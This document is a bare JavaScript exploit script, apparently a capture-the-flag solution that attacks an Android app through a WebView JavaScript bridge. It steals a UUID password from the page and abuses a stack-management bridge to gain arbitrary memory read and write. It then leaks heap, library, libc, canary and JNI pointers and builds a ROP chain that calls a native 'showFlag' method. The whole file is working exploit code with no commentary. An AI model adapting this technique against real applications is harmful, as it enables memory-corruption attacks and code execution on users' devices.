var password = top.x.document.body.innerHTML.match(
    /\b[0-9a-f]{8}\b-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-\b[0-9a-f]{12}\b/
)[0];

function stack_push(s) {
    return bridge.manageStack(password, "push", s);
}

function stack_pop() {
    return bridge.manageStack(password, "pop", "00");
}

function stack_top() {
    return bridge.manageStack(password, "top", "00");
}

function stack_edit(s) {
    return bridge.manageStack(password, "modify", s);
}

function u64(s) {
    let n = 0n;
    for (let i = 0; i < s.length && i < 16; i += 2) {
        n += BigInt(parseInt(s.substr(i, 2), 16)) << BigInt(i * 4);
    }
    return n;
}

function p64(n) {
    let s = "";
    while (n) {
        s += (n & 0xFFn).toString(16).padStart(2, "0");
        n >>= 8n;
    }
    return  s + "0".repeat(16 - s.length);
}

stack_push("41414141414141414141414141414141");
stack_push("41414141414141414141414141414141");

function read(addr) {
    stack_edit("41414141414141414141414141414141" + p64(addr));
    stack_pop();
    let leak = stack_top();
    stack_push("41414141414141414141414141414141");
    return leak;
}

function write(addr, data) {
    stack_edit("41414141414141414141414141414141" + p64(addr));
    stack_pop();
    stack_edit(data);
    stack_push("41414141414141414141414141414141");
}

stack_push("41414141414141414141414141414141");

var leak = stack_top();
var heap = u64(leak.slice(32));
var heap_n = u64(leak.slice(32)) & ~0xFFFn;
console.log("heap", "0x" + heap.toString(16));
console.log("heap_base", "0x" + heap_n.toString(16));

write(heap_n+0x3020n, "41".repeat(0x20))
write(heap_n+0x3040n, "41".repeat(0x8))
leak = read(heap_n+0x3020n);
var lib_base = u64(leak.substr(0x28 * 2, 12)) - 0x16ffn;
console.log("lib", "0x" + lib_base.toString(16));
write(heap_n+0x3020n, "41".repeat(0x28))
leak = read(heap_n+0x3020n);
var canary = leak.substr(0x28 * 2, 16);
console.log("canary", canary);
var stack = u64(leak.substr(0x30 * 2, 12));
console.log("stack", "0x" + stack.toString(16));
leak = read(lib_base + 0x2fa8n);
var strcpy = u64(leak);
var libc_base = strcpy - 0x53830n;
console.log("libc", "0x" + libc_base.toString(16));
leak = read(stack - 0x60n);
var JNIEnv = u64(leak);
console.log("JNIEnv", "0x" + JNIEnv.toString(16));
leak = read(stack - 0x68n);
var jobj = u64(leak);
console.log("jobj", "0x" + jobj.toString(16));

write(heap_n + 0x3070n, "73686f77466c616700") // showFlag
write(heap_n + 0x3080n, "28295600") // ()V

// 0x0000000000042c92: pop rdi; ret;
// 0x0000000000042d38: pop rsi; ret;
// 0x0000000000046175: pop rdx; r2et;
// 0x0000000000042e58: pop rcx; ret;
// 0x0000000000045e13: pop rax; ret;
var L_pop_rdi = libc_base + 0x42c92n;
var L_pop_rsi = libc_base + 0x42d38n;
var L_pop_rdx = libc_base + 0x46175n;
var L_pop_rcx = libc_base + 0x42e58n;
var L_pop_rax = libc_base + 0x45e13n;

var payload = "00".repeat(0x28);
payload += canary
payload += p64(stack)
payload += p64(L_pop_rdi) // rop begin
payload += p64(JNIEnv)
payload += p64(L_pop_rsi)
payload += p64(jobj)
payload += p64(L_pop_rdx)
payload += p64(heap_n + 0x3070n)
payload += p64(L_pop_rcx)
payload += p64(heap_n + 0x3080n)
payload += p64(L_pop_rdi + 1n)
payload += p64(lib_base + 0xfa0n)
write(heap_n+0x2120n, payload)
